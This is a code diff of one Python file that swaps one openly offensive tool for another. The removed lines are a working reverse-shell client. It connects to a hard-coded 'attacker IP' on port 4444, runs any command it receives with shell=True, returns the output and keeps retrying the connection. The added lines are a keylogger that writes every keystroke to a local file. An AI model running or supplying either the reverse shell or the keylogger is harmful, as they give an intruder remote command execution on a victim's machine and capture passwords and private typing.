@@ -1,39 +1,22 @@
-import socket
-import subprocess
-import os
+from pynput import keyboard                                    # Import the keyboard module from pynput for capturing key events
 
-C2_IP = '192.168.182.128'  # Your attacker IP
-C2_PORT = 4444             # Port to listen on the attacker side
+def on_press(key):                                             # Define a function that handles key press events
+    try:
+        with open("keyfile.txt", 'a') as logKey:               # Open the log file in append mode
+            if hasattr(key, 'char') and key.char:              # Check if the key has a character representation
+                logKey.write(key.char)                         # Write the character to the log file
+            else:
+                logKey.write(f'[{key}]')                       # Write special keys (e.g., [Shift], [Enter]) in readable format
+    except Exception as e:                                     # Catch any exception that occurs
+        print(f"Error logging key: {e}")                       # Print the error message to the console
 
-def connect_to_c2():
-    while True:
-        try:
-            # Create a socket and connect to attacker
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((C2_IP, C2_PORT))
+    if key == keyboard.Key.esc:                                # Check if the key is ESC
+        return False                                           # Returning False stops the listener
 
-            while True:
-                command = s.recv(1024).decode()
+def main():                                                    # Define the main function that starts the key listener
+    print("Starting key listener. Press 'ESC' to stop.")       # Inform the user that the listener has started
+    with keyboard.Listener(on_press=on_press) as listener:     # Create and start the key listener
+        listener.join()                                        # Keep the listener running until it is explicitly stopped (e.g., with ESC)
 
-                if command.lower() == 'exit':
-                    break
-
-                elif command.startswith('cd '):
-                    try:
-                        os.chdir(command[3:])
-                        s.send(f"[+] Changed to {os.getcwd()}".encode())
-                    except Exception as e:
-                        s.send(str(e).encode())
-
-                else:
-                    result = subprocess.run(command, shell=True, capture_output=True)
-                    output = result.stdout + result.stderr
-                    s.send(output if output else b"[+] Command executed.")
-
-            s.close()
-            break  # Exit after connection ends
-
-        except Exception:
-            continue  # Retry if connection fails
-
-connect_to_c2()
+if __name__ == "__main__":                                     # Check if the script is being run directly
+    main()                                                     # Call the main function to start the program
